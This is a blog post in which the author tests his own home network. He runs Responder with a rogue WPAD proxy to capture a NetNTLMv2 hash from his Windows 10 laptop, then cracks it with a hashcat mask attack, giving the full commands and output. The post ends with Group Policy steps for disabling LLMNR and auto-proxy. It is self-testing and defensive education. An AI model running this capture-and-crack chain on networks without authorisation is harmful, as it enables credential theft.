Testing my local network security with Responder | by Tomas Savenas | Medium

# Testing my local network security with Responder

[ ![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='57' height='57' viewBox='0 0 57 57' data-evernote-id='158' class='js-evernote-checked'%3e%3cpath fill-rule='evenodd' clip-rule='evenodd' d='M28.5 1.2A27.45 27.45 0 0 0 4.06 15.82L3 15.27A28.65 28.65 0 0 1 28.5 0C39.64 0 49.29 6.2 54 15.27l-1.06.55A27.45 27.45 0 0 0 28.5 1.2zM4.06 41.18A27.45 27.45 0 0 0 28.5 55.8a27.45 27.45 0 0 0 24.44-14.62l1.06.55A28.65 28.65 0 0 1 28.5 57 28.65 28.65 0 0 1 3 41.73l1.06-.55z' data-evernote-id='159' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e) ![1*WaZ8dyFCI-f0qqx7UcoZxA.jpeg](../_resources/48386885cd22f8f700158f12c4f62d09.jpg)](https://medium.com/@tomas_savenas?source=post_page-----caa1af10d2ca----------------------)

[Tomas Savenas](https://medium.com/@tomas_savenas?source=post_page-----caa1af10d2ca----------------------)

[Jun 1, 2019](https://medium.com/@tomas_savenas/testing-my-local-network-security-with-responder-caa1af10d2ca?source=post_page-----caa1af10d2ca----------------------) · 3 min read

[![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='25' height='25' viewBox='0 0 25 25' data-evernote-id='194' class='js-evernote-checked'%3e%3cpath d='M19 6a2 2 0 0 0-2-2H8a2 2 0 0 0-2 2v14.66h.01c.01.1.05.2.12.28a.5.5 0 0 0 .7.03l5.67-4.12 5.66 4.13a.5.5 0 0 0 .71-.03.5.5 0 0 0 .12-.29H19V6zm-6.84 9.97L7 19.64V6a1 1 0 0 1 1-1h9a1 1 0 0 1 1 1v13.64l-5.16-3.67a.49.49 0 0 0-.68 0z' fill-rule='evenodd' data-evernote-id='195' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40tomas_savenas%2Ftesting-my-local-network-security-with-responder-caa1af10d2ca&source=post_actions_header--------------------------bookmark_header-)

I learn about Responder in the Cyber Baltic Cyber Security Forum 2019 Vilnius Lithuania. There was a live demo with DHCP service and Responder. They successfully extracted the NTML hash from a locked laptop over the LAN cable.

I decided to test Windows 10 in my local network.

It should work with a rest Windows operating systems, which have enabled a Local File Sharing. My pen-testing tools were Kali Linux and Responder. [[1]](https://github.com/lgandx/Responder).

We can find the Responder tools in the latest Kali release. I tested with the command below:

responder -wFI eth0

In case of reproducing using other Linux distro, we can clone from Github and launch it from working directory. Also need to install python 2.7.

sudo apt update && apt install -y python
git clone https://github.com/lgandx/Responder
cd Responder/
./Responder.py -wFI eth0

In my case, I was on the same network, and I started Responder with WPAD rogue proxy server, and it was enough to open the only browser on a victim machine, and I saw an output below.

[HTTP] User-Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36

[HTTP] NTLMv2 Client : 192.168.88.54
[HTTP] NTLMv2 Username : DESKTOP-V2MNRGI\savenas

[HTTP] NTLMv2 Hash : **savenas::DESKTOP-V2MNRGI:86f6756855d20002:E1606DCAF3DB907E717A06DF435C224F:01010000000000003949CF770418D5017DEE38D5B2B9BDBF000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000EA34B675A6C0179A8C6BAAC85EAF80D417CCB9D38CFCF99A7C66FEC8C8EC35730A001000000000000000000000000000000000000900120048005400540050002F0077007000610064000000000000000000**

I used my favorite Hashcat tool and brute-force attack method. I prepared the NTML hash value to file hash.txt like this below.

savenas::DESKTOP-V2MNRGI:86f6756855d20002:E1606DCAF3DB907E717A06DF435C224F:01010000000000003949CF770418D5017DEE38D5B2B9BDBF000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000EA34B675A6C0179A8C6BAAC85EAF80D417CCB9D38CFCF99A7C66FEC8C8EC35730A001000000000000000000000000000000000000900120048005400540050002F0077007000610064000000000000000000

I know that my password made of 8 digits, so I used CPU power only and a mask ?d.

hashcat -m 5600 -a 3 hash.txt ?d?d?d?d?d?d?d?d --potfile-path ntlm.pot --force

It took insanely fast to reverse the NTML hash, but I used a weak password only with digits. The speed of cracking depends on how your password strong there is. More about this attack [[2](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)]

Session..........: hashcat
Status...........: Cracked
Hash.Type........: NetNTLMv2
Hash.Target......: SAVENAS::DESKTOP-V2MNRGI:86f6756855d20002:e1606dcaf...000000
Time.Started.....: Fri May 31 23:01:26 2019 (0 secs)
Time.Estimated...: Fri May 31 23:01:26 2019 (0 secs)
Guess.Mask.......: ?d?d?d?d?d?d?d?d [8]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 1293.4 kH/s (10.92ms) @ Accel:64 Loops:62 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 15872/100000000 (0.02%)
Rejected.........: 0/15872 (0.00%)
Restore.Point....: 0/100000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-62 Iteration:0-62
Candidates.#1....: 12345678 -> 04097999
**How to prevent it?**

I know an option on how to disable LLMNR and Auto Proxy via Group Policy Object [[3](https://www.vonahi.io/knowledge-base/how-to-disable-link-local-multicast-name-resolution-llmnr/)] [[4](https://support.microsoft.com/en-gb/help/271361/how-to-disable-automatic-proxy-caching-in-internet-explorer)]

- Open Group Policy Editor *gpedit.msc *(using Windows + R shortcut)
- Within the Local Group Policy Editor, navigate to Local Computer Policy -> Computer Configuration -> Administrative Templates -> Network -> DNS Client.
- Select the option for *Turn off Multicast Name Resolution*.
- By default, this option will be set to *Not Configured*. Change this option to *Enabled* to make this policy effective.
- Within the Local Group Policy Editor, navigate to User Configuration *-> *Administrative Templates *-> *Windows Components *-> *Internet Explorer
- Select the option for “Disable caching of Auto-Proxy scripts” and Click Enable, and then click OK.
- once again Windows + R shortcut and type *gupdate /force *to enforce Group Policy changes.

![1*e1iypsouAGB6jABtPW-JyA.jpeg](../_resources/271e92957693047a0e7173aa48a1b642.jpg)

Photo by [Christopher Gower](https://unsplash.com/@cgower?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText) on [Unsplash](https://unsplash.com/search/photos/local-network?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText)

**Reference**:
#1 https://github.com/lgandx/Responder
#2 https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4

#3 https://www.vonahi.io/knowledge-base/how-to-disable-link-local-multicast-name-resolution-llmnr/

#4 https://support.microsoft.com/en-gb/help/271361/how-to-disable-automatic-proxy-caching-in-internet-explorer